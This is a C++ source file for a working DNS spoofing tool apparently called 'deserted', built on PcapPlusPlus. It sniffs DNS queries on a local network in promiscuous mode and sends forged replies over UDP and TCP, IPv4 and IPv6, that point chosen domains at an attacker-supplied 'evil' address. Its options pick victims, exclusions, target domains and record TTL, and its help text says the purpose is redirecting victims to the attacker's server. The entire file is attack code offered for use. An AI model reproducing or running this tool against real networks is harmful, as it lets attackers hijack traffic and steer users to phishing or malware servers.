#include "Program.h"

#include <EthLayer.h>
#include <IPv4Layer.h>
#include <IPv6Layer.h>
#include <UdpLayer.h>
#include <TcpLayer.h>
#include <PcapFilter.h>
#include <PcapLiveDevice.h>

#include <chrono>
#include <thread>
#include <mutex>

#include "Screen.h"
#include "Utils.h"

Arguments Program::args{};
bool Program::isCapturing = false;
std::condition_variable Program::capturingEnded;

Program::Program(const std::string &name, int argc, char *argv[])
    : name(name),
      parser(name)
{
    ParseArguments(argc, argv);
    InitCaptureInterface();
}

void Program::Run()
{
    Screen::PrintBanner();
    std::cout << "Waiting for DNS packets to come...\n"
              << std::flush;

    if (interface.dev->startCapture(Program::OnPacketCapture, nullptr))
    {
        isCapturing = true;
        std::unique_lock<std::mutex> lckg(mtx);
        capturingEnded.wait(lckg, [this]
                            { return !isCapturing; }); // Sleep until we have stopped capturing
    }

    if (!isCapturing)
    {
        interface.dev->stopCapture();
        interface.dev->close();
    }
}

void Program::OnPacketCapture(pcpp::RawPacket *packet, pcpp::PcapLiveDevice *dev, void *cookie)
{
    pcpp::Packet parsedPacket(packet);
    pcpp::EthLayer *eth = parsedPacket.getLayerOfType<pcpp::EthLayer>();

    bool wasPoisoned = false;
    if (eth)
    {
        pcpp::IPv4Layer *ipLayer = parsedPacket.getLayerOfType<pcpp::IPv4Layer>();
        if (ipLayer) // Ipv4
        {

            switch (ipLayer->getIPv4Header()->protocol)
            {
            case pcpp::IPProtocolTypes::PACKETPP_IPPROTO_UDP:
            {
                pcpp::UdpLayer *udpLayer = parsedPacket.getLayerOfType<pcpp::UdpLayer>();
                pcpp::DnsLayer *dnsLayer = parsedPacket.getLayerOfType<pcpp::DnsLayer>();

                pcpp::DnsLayer poisonDns;
                wasPoisoned = Program::PoisonDns(*dnsLayer, poisonDns);

                if (!wasPoisoned)
                    return;

                pcpp::EthLayer poisonEth(eth->getDestMac(), eth->getSourceMac());
                pcpp::IPv4Layer poisonIp(ipLayer->getDstIPv4Address(), ipLayer->getSrcIPv4Address());
                poisonIp.getIPv4Header()->timeToLive = 64;
                pcpp::UdpLayer poisonUdp(udpLayer->getDstPort(), udpLayer->getSrcPort());

                pcpp::Packet poison;
                poison.addLayer(&poisonEth);
                poison.addLayer(&poisonIp);
                poison.addLayer(&poisonUdp);
                poison.addLayer(&poisonDns);

                poison.computeCalculateFields();
                
                dev->sendPacket(&poison);

                break;
            }
            case pcpp::IPProtocolTypes::PACKETPP_IPPROTO_TCP:
            {
                pcpp::TcpLayer *tcpLayer = parsedPacket.getLayerOfType<pcpp::TcpLayer>();
                pcpp::DnsLayer *dnsLayer = parsedPacket.getLayerOfType<pcpp::DnsLayer>();

                pcpp::DnsLayer poisonDns;
                wasPoisoned = Program::PoisonDns(*dnsLayer, poisonDns);

                if (!wasPoisoned)
                    return;

                pcpp::EthLayer poisonEth(eth->getDestMac(), eth->getSourceMac());
                pcpp::IPv4Layer poisonIp(ipLayer->getDstIPv4Address(), ipLayer->getSrcIPv4Address());
                poisonIp.getIPv4Header()->timeToLive = 64;
                pcpp::TcpLayer poisonTcp(tcpLayer->getDstPort(), tcpLayer->getSrcPort());

                pcpp::Packet poison;
                poison.addLayer(&poisonEth);
                poison.addLayer(&poisonIp);
                poison.addLayer(&poisonTcp);
                poison.addLayer(&poisonDns);

                poison.computeCalculateFields();
                dev->sendPacket(&poison);

                break;
            }
            default:
                return;
            }
        }
        else // IPv6
        {
            pcpp::IPv6Layer *ipLayer = parsedPacket.getLayerOfType<pcpp::IPv6Layer>();
            switch (ipLayer->getIPv6Header()->nextHeader)
            {
            case pcpp::IPProtocolTypes::PACKETPP_IPPROTO_UDP:
            {
                pcpp::UdpLayer *udpLayer = parsedPacket.getLayerOfType<pcpp::UdpLayer>();
                pcpp::DnsLayer *dnsLayer = parsedPacket.getLayerOfType<pcpp::DnsLayer>();

                pcpp::DnsLayer poisonDns(*dnsLayer);
                wasPoisoned = Program::PoisonDns(*dnsLayer, poisonDns);

                if (!wasPoisoned)
                    return;

                pcpp::EthLayer poisonEth(eth->getDestMac(), eth->getSourceMac());
                pcpp::IPv6Layer poisonIp(ipLayer->getDstIPv6Address(), ipLayer->getSrcIPv6Address());
                poisonIp.getIPv6Header()->hopLimit = 64;
                pcpp::UdpLayer poisonUdp(udpLayer->getDstPort(), udpLayer->getSrcPort());

                pcpp::Packet poison;
                poison.addLayer(&poisonEth);
                poison.addLayer(&poisonIp);
                poison.addLayer(&poisonUdp);
                poison.addLayer(&poisonDns);

                poison.computeCalculateFields();
                dev->sendPacket(&poison);

                break;
            }
            case pcpp::IPProtocolTypes::PACKETPP_IPPROTO_TCP:
            {
                pcpp::TcpLayer *tcpLayer = parsedPacket.getLayerOfType<pcpp::TcpLayer>();
                pcpp::DnsLayer *dnsLayer = parsedPacket.getLayerOfType<pcpp::DnsLayer>();

                pcpp::DnsLayer poisonDns;
                wasPoisoned = Program::PoisonDns(*dnsLayer, poisonDns);

                if (!wasPoisoned)
                    return;

                pcpp::EthLayer poisonEth(eth->getDestMac(), eth->getSourceMac());
                pcpp::IPv6Layer poisonIp(ipLayer->getDstIPv6Address(), ipLayer->getSrcIPv6Address());
                poisonIp.getIPv6Header()->hopLimit = 64;
                pcpp::TcpLayer poisonTcp(tcpLayer->getDstPort(), tcpLayer->getSrcPort());

                pcpp::Packet poison;
                poison.addLayer(&poisonEth);
                poison.addLayer(&poisonIp);
                poison.addLayer(&poisonTcp);
                poison.addLayer(&poisonDns);

                poison.computeCalculateFields();
                
                dev->sendPacket(&poison);

                break;
            }
            default:
                return;
            }
        }
    }

    Screen::SetColour(Screen::ForegroundColour::Green);
    std::cout << "Poisoned response sent." << std::endl;
    Screen::Reset();

    return;
}

bool Program::PoisonDns(const pcpp::DnsLayer &originalDns, pcpp::DnsLayer &poisonDns)
{
    if(originalDns.getDnsHeader()->queryOrResponse == 1) // No need to respond to responses
      return false;
    
    pcpp::DnsQuery *query = originalDns.getFirstQuery();
    while (query != nullptr)
    {
        switch (query->getDnsType())
        {
        case pcpp::DNS_TYPE_A:
        {
            if (args.specificDomains)
            {
                // The query domain is in the list of specified domains
                if (std::find(args.domains.begin(), args.domains.end(), query->getName()) != args.domains.end())
                {
                    pcpp::IPv4DnsResourceData poisonedData(args.evilIPv4);
                    poisonDns.addQuery(query);
                    poisonDns.addAnswer(query->getName(), query->getDnsType(), query->getDnsClass(), args.poisonTtl, &poisonedData);
                }
            }
            else
            {
                pcpp::IPv4DnsResourceData poisonedData(args.evilIPv4);
                poisonDns.addQuery(query);
                poisonDns.addAnswer(query->getName(), query->getDnsType(), query->getDnsClass(), args.poisonTtl, &poisonedData);

            }
            break;
        }
        case pcpp::DNS_TYPE_AAAA:
        {
            if (!args.poisonIPv6)
                break;
            if (args.specificDomains)
            {
                // The query domain is in the list of specified domains
                if (std::find(args.domains.begin(), args.domains.end(), query->getName()) != args.domains.end())
                {
                    pcpp::IPv6DnsResourceData poisonedData(args.evilIPv6);
                    poisonDns.addQuery(query);
                    poisonDns.addAnswer(query->getName(), query->getDnsType(), query->getDnsClass(), args.poisonTtl, &poisonedData);
                }
            }
            else
            {
                pcpp::IPv6DnsResourceData poisonedData(args.evilIPv6);
                poisonDns.addQuery(query);
                poisonDns.addAnswer(query->getName(), query->getDnsType(), query->getDnsClass(), args.poisonTtl, &poisonedData);
            }
            break;
        }
        default:
            break;
        }

        query = originalDns.getNextQuery(query);
    }

    // If no queries were poisoned due to domain name restrictions, return none
    if (poisonDns.getAnswerCount() == 0)
    {
        return false;
    }

    // Finish DNS poisoning
    poisonDns.getDnsHeader()->transactionID = originalDns.getDnsHeader()->transactionID;
    poisonDns.getDnsHeader()->recursionAvailable = 1; // Because why not
    poisonDns.getDnsHeader()->recursionDesired = originalDns.getDnsHeader()->recursionDesired;
    // poisonDns->getDnsHeader()->authenticData = 1;
    poisonDns.getDnsHeader()->queryOrResponse = 1;

    return true;
}

void Program::ParseArguments(int argc, char *argv[])
{
    parser.add_argument("-t", "--targets").help("A comma-separated list of hosts (IPv4 or IPv6) without whitespace");
    parser.add_argument("-i", "--interface").required().help("Network interface to use");
    parser.add_argument("-b", "--bad-ip").required().help("IPv4 Address to inject into the cache. This shold be the address of the server you want to redirect the victim to");
    parser.add_argument("-e", "--bad-ipv6").help("IPv6 Address to inject into the cache. This shold be the address of the server you want to redirect the victim to");
    parser.add_argument("--ttl").default_value<uint32_t>(62).help("The time-to-live of the poisoned DNS record (specified in seconds)").scan<'u', uint32_t>();
    parser.add_argument("-d", "--domains").help("A comma-separated list, without whitespace, of specific domains to poison. By default deserted will poison all domains.");
    parser.add_argument("-p", "--ports").nargs(argparse::nargs_pattern::any).default_value(std::vector<uint16_t>{53, 5353}).help("The possible destination ports of outbound DNS queries").scan<'i', uint16_t>();

    std::vector<std::string> errors;
    try
    {
        parser.parse_args(argc, argv);

        // Parse bad IPv4
        args.evilIPv4 = pcpp::IPv4Address(parser.get("--bad-ip"));
        if (!args.evilIPv4.isValid())
        {
            errors.emplace_back("Invalid malicious IPv4 specified!");
        }

        // Parse bad IPv6
        if (parser.is_used("--bad-ipv6"))
        {
            args.evilIPv6 = pcpp::IPv6Address(parser.get("--bad-ipv6"));
            if (!args.evilIPv6.isValid())
            {
                errors.emplace_back("Invalid malicious IPv6 specified!");
            }
            args.poisonIPv6 = true;
        }

        // Parse interface
        args.interface = parser.get("--interface");
        interface.name = args.interface;
        interface.dev = pcpp::PcapLiveDeviceList::getInstance().getPcapLiveDeviceByName(interface.name);
        if (!interface.dev)
        {
            errors.emplace_back("Failed to use the specified interface");
        }

        // Parse targets
        try
        {
            std::vector<std::string> targets = std::move(SplitString(parser.get("--targets"), ','));

            for (const auto &t : targets)
            {
                if (t[0] == '~')
                {
                    pcpp::IPv4Address IPv4(t.substr(1));
                    if (IPv4.isValid())
                    {
                        args.targets.hasExclusions = true;
                        args.targets.exclusionsV4.emplace_back(std::move(IPv4));
                        continue;
                    }
                    else
                    {
                        pcpp::IPv6Address IPv6(t.substr(1));
                        if (IPv6.isValid())
                        {
                            args.targets.hasExclusions = true;
                            args.targets.exclusionsV6.emplace_back(std::move(IPv6));
                            continue;
                        }
                        else
                        {
                            errors.emplace_back("Targets list contains an invalid IP address: " + t);
                            break;
                        }
                    }
                }

                pcpp::IPv4Address IPv4(t);
                if (IPv4.isValid())
                {
                    args.targets.hasTargets = true;
                    args.targets.V4.emplace_back(std::move(IPv4));
                    continue;
                }
                else
                {
                    pcpp::IPv6Address IPv6(t);
                    if (IPv6.isValid())
                    {
                        args.targets.hasTargets = true;
                        args.targets.V6.emplace_back(std::move(IPv6));
                        continue;
                    }
                    else
                    {
                        errors.emplace_back("Targets list contains an invalid IP address: " + t);
                        break;
                    }
                }
            }
        }
        catch (...)
        {
        }

        // Parse TTL
        args.poisonTtl = parser.get<uint32_t>("--ttl");

        // Parse domains
        if (parser.is_used("--domains"))
        {
            args.specificDomains = true;
            args.domains = std::move(SplitString(parser.get("--domains"), ','));
        }

        // Parse ports
        args.ports = parser.get<std::vector<uint16_t>>("--ports");

        if (errors.size() != 0)
        {
            std::string error_message = "";
            for (const auto &err : errors)
                error_message += err + "\n";
            throw std::runtime_error(error_message);
        }
    }
    catch (const std::runtime_error &err)
    {
        Screen::SetColour(Screen::ForegroundColour::Red);
        std::cerr << err.what() << '\n';
        Screen::Reset();

        std::cout << parser;
        exit(0);
    }
}

void Program::InitCaptureInterface()
{
    pcpp::PcapLiveDevice::DeviceConfiguration config(pcpp::PcapLiveDevice::DeviceMode::Promiscuous);
    if (!interface.dev->open(config))
    {
        Screen::SetColour(Screen::ForegroundColour::Red);
        std::cerr << "Failed to open interface." << std::endl;
        Screen::Reset();
        exit(0);
    }

    // Compile filter
    std::string filter = "(";
    // Add ports to filter
    for (size_t i = 0; i < args.ports.size(); ++i)
    {
        if (i != args.ports.size() - 1)
        {
            filter.append("dst port " + std::to_string(args.ports[i]) + " or ");
            continue;
        }

        filter.append("dst port " + std::to_string(args.ports[i]) + ") ");
    }

    // Add targets/exclusions to filter
    if (args.targets.hasTargets)
    {
        filter.append("and (");
        for (size_t i = 0; i < args.targets.V4.size(); ++i)
        {
            if (i != args.targets.V4.size() - 1)
            {
                filter.append("src host " + args.targets.V4[i].toString() + " or ");
                continue;
            }

            filter.append("src host " + args.targets.V4[i].toString() + ") ");
        }

        if (args.targets.V4.size() != 0 && args.targets.exclusionsV6.size() != 0)
        {
            filter.append("or (");
        }
        else if (args.targets.V4.size() == 0 && args.targets.exclusionsV6.size() != 0)
        {
            filter.append("and (");
        }
        for (size_t i = 0; i < args.targets.V6.size(); ++i)
        {
            if (i != args.targets.V6.size() - 1)
            {
                filter.append("src host " + args.targets.V6[i].toString() + " or ");
                continue;
            }

            filter.append("src host " + args.targets.V6[i].toString() + ") ");
        }
    }
    else if (args.targets.hasExclusions)
    {
        filter.append("and (");
        for (size_t i = 0; i < args.targets.exclusionsV4.size(); ++i)
        {
            if (i != args.targets.exclusionsV4.size() - 1)
            {
                filter.append("not src host " + args.targets.exclusionsV4[i].toString() + " and ");
                continue;
            }

            filter.append("not src host " + args.targets.exclusionsV4[i].toString() + ") ");
        }

        if (args.targets.exclusionsV6.size() != 0)
            filter.append("and (");
        for (size_t i = 0; i < args.targets.exclusionsV6.size(); ++i)
        {
            if (i != args.targets.exclusionsV6.size() - 1)
            {
                filter.append("not src host " + args.targets.exclusionsV6[i].toString() + " and ");
                continue;
            }

            filter.append("not src host " + args.targets.exclusionsV6[i].toString() + ") ");
        }
    }

    if (!interface.dev->setFilter(filter))
    {
        Screen::SetColour(Screen::ForegroundColour::Red);
        std::cerr << "Failed to setup capture filters." << std::endl;
        Screen::Reset();

        exit(0);
    }

}